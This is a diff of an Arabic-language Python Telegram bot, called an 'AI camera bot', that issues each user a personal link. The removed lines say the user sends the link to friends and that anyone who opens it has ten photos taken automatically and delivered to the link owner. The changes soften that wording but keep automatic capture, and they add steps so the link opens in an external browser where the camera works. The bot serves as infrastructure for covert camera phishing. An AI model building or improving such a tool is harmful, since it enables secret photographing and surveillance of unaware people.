@@ -12,6 +12,10 @@ import os
 # ---------------------------------------------
 app = Flask(__name__)
 
+# إحصائيات (تعريفها هنا لتكون متاحة للجميع)
+user_stats = {}
+total_photos_received = 0
+
 @app.route('/')
 def home():
     return """
@@ -54,8 +58,6 @@ def home():
             <h1>🤖 بوت كاميرا الذكاء الاصطناعي</h1>
             <div class="status">✅ البوت يعمل بنجاح</div>
             <p>تم تشغيل البوت في: <strong>""" + str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + """</strong></p>
-            <p>عدد المستخدمين المسجلين: <strong>""" + str(len(user_stats)) + """</strong></p>
-            <p>إجمالي الصور المستلمة: <strong>""" + str(total_photos_received) + """</strong></p>
             <hr>
             <p>استخدم الأمر /start في تلجرام للحصول على رابطك الشخصي</p>
         </div>
@@ -70,7 +72,6 @@ def webhook():
     return jsonify({"status": "ok", "message": "Webhook received"})
 
 def run():
-    # بورت 8080 هو البورت القياسي الذي ينتظره Render
     app.run(host='0.0.0.0', port=8080)
 
 def keep_alive():
@@ -93,10 +94,6 @@ logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 logger = logging.getLogger(__name__)
-
-# إحصائيات
-user_stats = {}  # {user_id: {"name": str, "photo_count": int, "first_seen": datetime}}
-total_photos_received = 0
 
 # ---------------------------------------------
 # 3. معالجة الأوامر
@@ -122,12 +119,12 @@ def send_welcome(message):
     personal_link = f"{BASE_URL}?id={user_id}"
     
     # إنشاء كيبورد (لوحة مفاتيح) تفاعلية
-    markup = telebot.types.InlineKeyboardMarkup()
+    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
     
-    # زر لفتح الكاميرا مباشرة
-    camera_btn = telebot.types.InlineKeyboardButton(
-        text="📸 افتح الكاميرا الآن", 
-        url=personal_link
+    # ✅ التعديل: زر لنسخ الرابط (بدلاً من فتحه)
+    copy_btn = telebot.types.InlineKeyboardButton(
+        text="📋 انسخ الرابط", 
+        callback_data=f"copy_{user_id}"
     )
     
     # زر للحصول على التعليمات
@@ -142,17 +139,23 @@ def send_welcome(message):
         callback_data="stats"
     )
     
-    markup.add(camera_btn)
+    markup.add(copy_btn)
     markup.add(help_btn, stats_btn)
     
     response = (
         f"🎉 أهلاً بك *{user_name}*!\n\n"
         f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
         f"`{personal_link}`\n\n"
-        f"📌 *طريقة الاستخدام:*\n"
-        f"1. انسخ الرابط أعلاه\n"
-        f"2. أرسله لأصدقائك\n"
-        f"3. أي شخص يفتح الرابط ويصور نفسه، ستصل صورته إليك فوراً!\n\n"
+        f"⚠️ *تنبيه مهم جداً:*\n"
+        f"❌ *لا تفتح الرابط من داخل تليجرام* - الكاميرا لن تعمل!\n"
+        f"✅ *انسخ الرابط* وافتحه في متصفح خارجي (Chrome, Safari)\n\n"
+        f"📌 *طريقة الاستخدام الصحيحة:*\n"
+        f"1. اضغط على زر \"انسخ الرابط\"\n"
+        f"2. اضغط مع الاستمرار على الرابط واختر \"نسخ\"\n"
+        f"3. افتح متصفح كروم أو سفاري\n"
+        f"4. الصق الرابط في شريط العنوان\n"
+        f"5. اسمح بالوصول إلى الكاميرا\n"
+        f"6. سيتم التقاط الصور تلقائياً وإرسالها إليك\n\n"
         f"🔒 *ملاحظة:* الرابط خاص بك فقط ولا يشاركه أحد آخر"
     )
     
@@ -161,6 +164,31 @@ def send_welcome(message):
                     reply_markup=markup)
     
     logger.info(f"New user started: {user_name} (ID: {user_id})")
+
+# ✅ إضافة دالة جديدة لمعالجة نسخ الرابط
+@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
+def copy_link(call):
+    """نسخ الرابط عند الضغط على الزر"""
+    user_id = call.data.replace("copy_", "")
+    personal_link = f"{BASE_URL}?id={user_id}"
+    
+    # إجابة على الضغط
+    bot.answer_callback_query(call.id, "📋 اضغط مع الاستمرار على الرابط لنسخه!")
+    
+    # إرسال رسالة تحتوي على الرابط مع تعليمات
+    bot.send_message(
+        call.message.chat.id,
+        f"📋 *رابطك الشخصي:*\n"
+        f"`{personal_link}`\n\n"
+        f"📌 *طريقة النسخ والاستخدام:*\n"
+        f"1️⃣ اضغط مع الاستمرار على الرابط أعلاه\n"
+        f"2️⃣ اختر \"نسخ\" من القائمة\n"
+        f"3️⃣ افتح متصفح كروم أو سفاري\n"
+        f"4️⃣ الصق الرابط في شريط العنوان\n"
+        f"5️⃣ اسمح بالوصول إلى الكاميرا\n\n"
+        f"⚠️ *تذكير مهم:* لا تفتح الرابط من داخل تليجرام!",
+        parse_mode="Markdown"
+    )
 
 @bot.message_handler(commands=['stats'])
 def show_stats(message):
@@ -172,7 +200,7 @@ def show_stats(message):
         response = (
             f"📊 *إحصائياتك الشخصية*\n\n"
             f"👤 الاسم: {user_stat['name']}\n"
-            f"🆔 رقمك: {user_id}\n"
+            f"🆔 رقمك: `{user_id}`\n"
             f"📸 عدد الصور المستلمة: {user_stat['photo_count']}\n"
             f"📅 تاريخ التسجيل: {user_stat['first_seen'].strftime('%Y-%m-%d')}\n"
             f"🕐 آخر نشاط: {user_stat['last_active'].strftime('%Y-%m-%d %H:%M')}\n\n"
@@ -195,13 +223,13 @@ def send_help(message):
         "❓ /help - عرض هذه التعليمات\n\n"
         "🔧 *كيف يعمل البوت:*\n"
         "1. اضغط على /start للحصول على رابطك الشخصي\n"
-        "2. أرسل الرابط لأصدقائك\n"
-        "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
-        "4. يتم التقاط 10 صور تلقائياً (صورة كل 5 ثواني)\n"
-        "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
+        "2. اضغط على زر \"انسخ الرابط\"\n"
+        "3. انسخ الرابط وافتحه في متصفح خارجي (Chrome/Safari)\n"
+        "4. اسمح بالوصول إلى الكاميرا\n"
+        "5. يتم التقاط الصور تلقائياً وإرسالها إليك\n\n"
         "⚠️ *ملاحظات هامة:*\n"
-        "• البوت يأخذ 10 صور فقط ثم يتوقف\n"
-        "• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
+        "• ❌ لا تفتح الرابط من داخل تليجرام - الكاميرا لن تعمل!\n"
+        "• ✅ يجب فتح الرابط في متصفح خارجي فقط\n"
         "• الصور تصل فقط لصاحب الرابط\n"
         "• لا يتم حفظ الصور في أي سيرفر\n\n"
         "🛠️ للمساعدة التقنية: @khaled_developer"
@@ -228,14 +256,6 @@ def broadcast_message(message):
     
     broadcast_text = command_parts[1]
     
-    # إعداد زر للموقع
-    markup = telebot.types.InlineKeyboardMarkup()
-    site_btn = telebot.types.InlineKeyboardButton(
-        text="🌐 زيارة الموقع", 
-        url=BASE_URL
-    )
-    markup.add(site_btn)
-    
     # البث لجميع المستخدمين
     success_count = 0
     fail_count = 0
@@ -244,10 +264,9 @@ def broadcast_message(message):
         try:
             bot.send_message(uid, 
                            f"📢 *إشعار من المطور:*\n\n{broadcast_text}", 
-                           parse_mode="Markdown",
-                           reply_markup=markup)
+                           parse_mode="Markdown")
             success_count += 1
-            time.sleep(0.1)  # لتجنب حظر تلجرام
+            time.sleep(0.1)
         except Exception as e:
             logger.error(f"Failed to send to {uid}: {e}")
             fail_count += 1
@@ -288,20 +307,19 @@ def handle_photos(message):
     
     # الحصول على معلومات الملف
     file_info = bot.get_file(file_id)
-    file_size = file_info.file_size / 1024  # حجم بالكيلوبايت
+    file_size = file_info.file_size / 1024
     
     # إرسال تأكيد استلام
     caption = (
         f"✅ تم استلام صورة جديدة!\n\n"
         f"👤 من: {user_name}\n"
-        f"🆔 الرقم: {user_id}\n"
+        f"🆔 الرقم: `{user_id}`\n"
         f"📏 الحجم: {file_size:.1f} كيلوبايت\n"
         f"🖼️ إجمالي صورك: {user_stats[user_id]['photo_count']}\n"
         f"📊 الإجمالي الكلي: {total_photos_received}"
     )
     
-    # إرسال الصورة مع التسمية التوضيحية
-    bot.reply_to(message, caption)
+    bot.reply_to(message, caption, parse_mode="Markdown")
     
     logger.info(f"Received photo from {user_name} (ID: {user_id}) - Size: {file_size:.1f}KB")
 
@@ -311,8 +329,6 @@ def handle_photos(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    user_id = call.from_user.id
-    
     if call.data == "help":
         send_help(call.message)
         bot.answer_callback_query(call.id, "📖 عرض التعليمات")
@@ -320,6 +336,10 @@ def handle_callback(call):
     elif call.data == "stats":
         show_stats(call.message)
         bot.answer_callback_query(call.id, "📊 عرض الإحصائيات")
+    
+    elif call.data.startswith("copy_"):
+        # تم معالجتها في الدالة المنفصلة أعلاه
+        pass
 
 # ---------------------------------------------
 # 6. معالجة الرسائل النصية العادية
@@ -327,8 +347,7 @@ def handle_callback(call):
 
 @bot.message_handler(func=lambda message: True)
 def handle_all_messages(message):
-    if message.text.startswith('/'):
-        # إذا كان أمر غير معروف
+    if message.text and message.text.startswith('/'):
         bot.reply_to(message, 
                     "❌ أمر غير معروف!\n\n"
                     "✅ الأوامر المتاحة:\n"
@@ -336,14 +355,13 @@ def handle_all_messages(message):
                     "/stats - لعرض إحصائياتك\n"
                     "/help - للتعليمات والمساعدة")
     else:
-        # معالجة الرسائل النصية العادية
         welcome_text = (
             f"مرحباً {message.from_user.first_name}! 👋\n\n"
             f"يمكنك استخدام الأوامر التالية:\n"
             f"• /start - للحصول على رابطك الشخصي\n"
             f"• /stats - لعرض إحصائياتك\n"
             f"• /help - للتعليمات\n\n"
-            f"أو أرسل صورة وسأقوم بحفظها لك! 📸"
+            f"أو اضغط على زر \"انسخ الرابط\" بعد /start 📋"
         )
         bot.reply_to(message, welcome_text)
 
@@ -359,7 +377,7 @@ print("🤖 بوت كاميرا الذكاء الاصطناعي")
 print(f"⏰ تم التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
 print("=" * 50)
 
-# حلقة التشغيل اللانهائية (لمنع التوقف عند الأخطاء البسيطة)
+# حلقة التشغيل اللانهائية
 while True:
     try:
         logger.info("Starting bot polling...")
